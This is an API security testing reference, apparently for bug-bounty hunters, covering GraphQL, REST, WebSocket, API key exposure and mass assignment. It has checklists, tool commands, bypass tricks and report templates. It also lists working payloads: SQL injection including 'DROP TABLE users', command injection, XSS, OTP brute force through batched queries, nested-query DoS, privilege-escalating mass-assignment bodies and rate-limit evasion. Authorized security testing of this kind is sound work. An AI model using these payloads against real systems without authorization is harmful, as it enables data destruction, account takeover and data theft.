# API Security Vulnerabilities Reference

## Covers: GraphQL, REST, WebSocket, API Key Exposure, Mass Assignment

---

## 1. Testing Checklist

### GraphQL
1. Discover GraphQL endpoint: `/graphql`, `/gql`, `/api/graphql`, `/v1/graphql`, `/query`
2. Run introspection query to dump full schema
3. If introspection is disabled, use field suggestion (Clairvoyance) to reconstruct schema
4. Test every query and mutation for authorization (swap auth tokens)
5. Check for query depth/complexity limits (nested queries for DoS)
6. Test batched queries for rate limit bypass
7. Look for debug/hidden fields: `__type`, `_debug`, deprecated fields
8. Test mutations for mass assignment (add fields not in the frontend)
9. Check for SQL injection in filter/search arguments
10. Test file upload mutations if present
11. Look for subscription endpoints (WebSocket) for real-time data leaks

### REST API
1. Map all endpoints via docs (Swagger/OpenAPI), JS files, mobile app traffic
2. Test all CRUD operations with different auth levels
3. Test HTTP method override: `X-HTTP-Method-Override`, `_method` parameter
4. Check for API versioning bypass: `/api/v1/` vs `/api/v2/` (older versions may lack auth)
5. Test content-type switching: JSON -> XML (may enable XXE)
6. Check for verbose error messages leaking stack traces, internal paths
7. Test rate limiting on sensitive endpoints (login, password reset, OTP verify)
8. Look for undocumented endpoints via wordlist fuzzing
9. Check CORS configuration on API endpoints
10. Test pagination for data leakage: large `limit` values, negative `offset`

### WebSocket
1. Identify WebSocket endpoints (check `wss://` or `ws://` in JS files, network tab)
2. Test origin validation: connect from different origins
3. Check authentication: is the WebSocket authenticated? Can you connect without cookies/tokens?
4. Test for injection in WebSocket messages (XSS, SQLi, command injection)
5. Check for IDOR in WebSocket subscriptions (subscribe to other users' channels)
6. Test message rate limiting
7. Look for cross-site WebSocket hijacking (CSWSH)
8. Check if sensitive data is broadcast to all connected clients

### API Key Exposure
1. Search JavaScript files for API keys, tokens, secrets
2. Check mobile app binaries (APK decompile, IPA extract)
3. Search GitHub/GitLab for leaked keys: `org:target "api_key"`, `org:target "secret"`
4. Check `.env` files, config files exposed via path traversal
5. Test found keys for scope/permissions
6. Check if keys are in URL parameters (logged in proxies, referrer headers)
7. Search Wayback Machine for historically exposed keys

### Mass Assignment
1. Identify all attributes returned in API responses
2. Add extra fields in create/update requests that aren't in the form
3. Common targets: `role`, `isAdmin`, `is_verified`, `balance`, `credits`, `plan`, `permissions`
4. Test nested object assignment: `{"user": {"role": "admin"}}`
5. Check if read-only fields can be written: `id`, `created_at`, `updated_at`, `email_verified`
6. Compare API documentation with actual accepted fields
7. Test with all fields from GET response sent back in PUT/PATCH

---

## 2. Tool Commands

### GraphQL
```bash
# Introspection query
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' | jq .

# Full introspection with InQL or graphql-voyager
inql -t https://target.com/graphql -o /tmp/graphql-output

# Clairvoyance (when introspection is disabled)
clairvoyance https://target.com/graphql -o schema.json

# graphw00f - fingerprint GraphQL engine
graphw00f -t https://target.com/graphql

# Batch query test
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"},{"query":"{ user(id:3) { email } }"}]'

# Query depth test (DoS)
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { posts { comments { author { posts { comments { author { name } } } } } } } }"}'
```

### REST API
```bash
# Discover API endpoints from JS files
katana -u https://target.com -jc -d 3 | grep -oP '/api/[^\s"'"'"']*' | sort -u

# Swagger/OpenAPI discovery
ffuf -u "https://target.com/FUZZ" -w <(echo -e "swagger.json\nopenapi.json\napi-docs\nswagger/v1/swagger.json\nv1/api-docs\nv2/api-docs\napi/swagger.json\nswagger-ui.html\n.well-known/openapi.json") -mc 200

# Fuzz API endpoints
ffuf -u "https://target.com/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,204,301,302,401,403,405

# Test all HTTP methods on an endpoint
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo "=== $method ==="
  curl -s -o /dev/null -w "%{http_code}" -X "$method" "https://target.com/api/v1/users" \
    -H "Authorization: Bearer TOKEN"
  echo
done

# CORS check
curl -s -D- "https://target.com/api/data" \
  -H "Origin: https://evil.com" | grep -i "access-control"
```

### WebSocket
```bash
# websocat - connect to WebSocket
websocat wss://target.com/ws -H "Cookie: session=TOKEN"

# wscat
wscat -c wss://target.com/ws -H "Cookie: session=TOKEN"

# Test CSWSH (no auth / no origin check)
websocat wss://target.com/ws --origin https://evil.com
```

### API Key Hunting
```bash
# trufflehog - scan for secrets in repos
trufflehog github --org=targetorg --only-verified

# Search JS files for keys
katana -u https://target.com -jc -d 3 | grep '\.js$' | sort -u | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|api[_-]?secret|access[_-]?token|auth[_-]?token|client[_-]?secret|private[_-]?key|jwt[_-]?secret)\s*[:=]\s*['"'"'"][^'"'"'"]+['"'"'"]'
done

# GitHub dorking
gh search code "org:target AKIA" --json path,repository,url
gh search code "org:target api_key" --json path,repository,url

# gitleaks on a repo
gitleaks detect -s /path/to/repo -v
```

---

## 3. Payloads

### GraphQL Introspection
```graphql
# Full introspection
{__schema{queryType{name}mutationType{name}types{name kind fields{name args{name type{name kind ofType{name kind}}}type{name kind ofType{name kind}}}}}}

# Shortened introspection (when full is blocked)
{__schema{types{name,fields{name}}}}

# Field suggestion brute force
{user(id:1){a]}}
# Error may reveal: "Did you mean 'admin', 'address', 'age'?"
```

### GraphQL Injection
```graphql
# IDOR via node interface
{ node(id: "VXNlcjox") { ... on User { email password_hash } } }

# Batch query for rate limit bypass (e.g., OTP brute force)
[
  {"query":"mutation{verifyOTP(code:\"000000\"){success}}"},
  {"query":"mutation{verifyOTP(code:\"000001\"){success}}"},
  {"query":"mutation{verifyOTP(code:\"000002\"){success}}"}
]

# Alias-based batching (single query)
{
  a1: user(id: 1) { email }
  a2: user(id: 2) { email }
  a3: user(id: 3) { email }
}

# SQL injection in arguments
{ users(search: "' OR 1=1-- -") { id email } }
{ users(order: "name; DROP TABLE users--") { id } }

# Nested query DoS
{ users { posts { comments { author { posts { comments { author { name }}}}}}}}

# Directive overloading DoS
query { user @aa @bb @cc @dd @ee @ff @gg @hh ... (repeat 1000s) { name } }
```

### REST API Mass Assignment
```json
// Registration with privilege escalation
{"username":"attacker","password":"pass123","role":"admin"}
{"username":"attacker","password":"pass123","is_admin":true}
{"username":"attacker","password":"pass123","permissions":["admin","super_admin"]}

// Profile update with balance manipulation
{"name":"attacker","balance":99999}
{"name":"attacker","credits":99999,"plan":"enterprise"}
{"name":"attacker","email_verified":true}

// Nested assignment
{"user":{"name":"attacker","role":"admin"}}
{"profile":{"name":"attacker"},"account":{"type":"premium"}}
```

### CORS Exploitation
```
# Test various origins
Origin: https://evil.com
Origin: https://target.com.evil.com
Origin: https://eviltarget.com
Origin: null
Origin: https://subdomain.target.com  (any subdomain reflected?)
```

### WebSocket Payloads
```json
// IDOR - subscribe to other user's channel
{"action": "subscribe", "channel": "user_456"}

// Injection in messages
{"action": "search", "query": "' OR 1=1-- -"}
{"action": "update", "field": "<img src=x onerror=alert(1)>"}
{"action": "execute", "command": "; id"}
```

---

## 4. Bypass Techniques

### GraphQL Protection Bypass
- **Introspection disabled**: Use Clairvoyance for field suggestion, brute force field names
- **Query depth limit**: Use fragments and aliases to restructure query
- **Cost/complexity limit**: Split into multiple batched queries
- **Rate limiting**: Batch queries in single request, use aliases
- **Mutation blocking**: Check if queries can trigger mutations via nested resolvers
- **Persisted queries**: Find the query ID mapping, or test arbitrary query execution
- **GET request blocking**: Try POST with `application/json`, or GET with `?query=` parameter

### REST API Bypass
- **403 on endpoint**: Try `X-Original-URL`, `X-Rewrite-URL` headers
- **Method not allowed**: Try `X-HTTP-Method-Override: PUT` on a POST request
- **Rate limiting**: Rotate `X-Forwarded-For`, add `X-Real-IP`, use IPv6
- **Version bypass**: `/api/v1/admin` blocked -> try `/api/v2/admin`, `/api/internal/admin`
- **Path normalization**: `/api/users/../admin/config`, `/api/./admin`, `/api/admin;.json`
- **Case sensitivity**: `/API/ADMIN`, `/Api/Admin`
- **Trailing characters**: `/api/admin/`, `/api/admin.json`, `/api/admin%20`, `/api/admin%0a`
- **Parameter pollution**: `?id=1&id=2` (different handling by framework)

### WebSocket Auth Bypass
- **Missing origin validation**: Connect from any origin -> CSWSH
- **Token in URL**: `wss://target.com/ws?token=XXX` -> token in logs
- **Missing re-authentication**: Token expires but WebSocket stays connected
- **Downgrade**: If `wss://` enforced, try `ws://` on different port

### API Key Bypass
- **Key rotation not enforced**: Old keys still work after rotation
- **Scope bypass**: Key for read-only access can actually write
- **Rate limiting per key**: Create multiple keys
- **Key in URL vs header**: Move key from header to query param or vice versa

---

## 5. Impact Escalation

### GraphQL
- Introspection -> full schema knowledge -> find hidden sensitive queries/mutations
- Batch queries -> bypass rate limiting -> brute force OTP/credentials
- IDOR in queries -> mass data extraction
- Nested query DoS -> service disruption

### REST API
- Undocumented admin endpoints -> full platform control
- CORS misconfiguration -> steal user data from any origin
- Mass assignment -> privilege escalation, financial manipulation
- API version bypass -> access deprecated insecure endpoints

### WebSocket
- CSWSH -> perform actions as victim (like CSRF but for WebSocket)
- IDOR in subscriptions -> real-time data leakage
- Missing rate limits -> spam, DoS, brute force

### API Key Exposure
- Determine key scope: read-only vs write access
- Test against all API endpoints
- Check for access to PII, financial data, admin functions
- Test cloud provider keys for infrastructure access (AWS AKIA* -> S3, EC2, IAM)

---

## 6. Chain Opportunities

| Found This | Look For |
|---|---|
| GraphQL introspection | Hidden admin mutations, sensitive fields, internal types |
| GraphQL IDOR | Mass data extraction, chain with batch queries |
| REST CORS miscfg | Steal auth tokens -> ATO, exfil sensitive API data |
| Mass assignment | Privilege escalation -> admin -> more vulns in admin features |
| API key in JS | Test all scopes, check if key accesses cloud infra |
| WebSocket no auth | Subscribe to admin channels, inject messages as other users |
| API version bypass | Old API versions often lack security patches |
| Swagger/OpenAPI exposed | Full endpoint map -> targeted IDOR/auth testing |

---

## 7. Common False Positives

- **GraphQL introspection enabled**: Some programs consider this informational, not a vulnerability. Focus on what you can DO with the schema, not just that it's exposed
- **CORS with `Access-Control-Allow-Origin: *`**: Only a vuln if endpoint returns sensitive data AND credentials are included. Wildcard `*` prevents `withCredentials`
- **CORS reflecting origin**: Only impactful if response contains sensitive data with `Access-Control-Allow-Credentials: true`
- **API key in JavaScript**: May be intentionally public (Google Maps frontend key, Stripe publishable key). Check if the key has dangerous scopes
- **Mass assignment**: Server accepts extra fields but ignores them (check if the value actually changed)
- **WebSocket without auth**: May be intentionally public (e.g., public chat, stock ticker)
- **GraphQL depth limit DoS**: If there IS a depth limit and it works, that's a non-issue

---

## 8. Report Snippets

### GraphQL Authorization Bypass
> The GraphQL API at `[endpoint]` lacks proper authorization checks on the `[query/mutation]` operation. By sending an authenticated request with a low-privilege token, I was able to access/modify data belonging to other users. Using batched alias queries, I extracted [N] records containing [sensitive data types]. The schema (obtained via introspection/field suggestion) reveals [additional sensitive operations].

### CORS Misconfiguration
> The API at `[endpoint]` reflects the `Origin` header in `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`. This allows any website to make authenticated cross-origin requests and read the responses. An attacker can host a page that silently exfiltrates the victim's [data type] when they visit it. PoC: [HTML that demonstrates the attack].

### Mass Assignment
> The `[endpoint]` accepts additional fields beyond those present in the client-side form. By adding `[field_name]: [value]` to the [create/update] request, I was able to [specific impact: escalate to admin / modify account balance / bypass email verification]. This bypasses the intended access control and allows [impact description].

### API Key Exposure
> A [key type] API key with [scope description] permissions was found in [location: JS file / GitHub repo / mobile app]. Using this key, I was able to [specific actions performed]. This provides unauthorized access to [resources/data] and could be used to [worst-case scenario].

### WebSocket Hijacking
> The WebSocket endpoint at `[URL]` does not validate the `Origin` header, enabling cross-site WebSocket hijacking. An attacker can establish a WebSocket connection from a malicious page visited by an authenticated user, allowing them to [send messages as the victim / subscribe to private channels / exfiltrate real-time data].
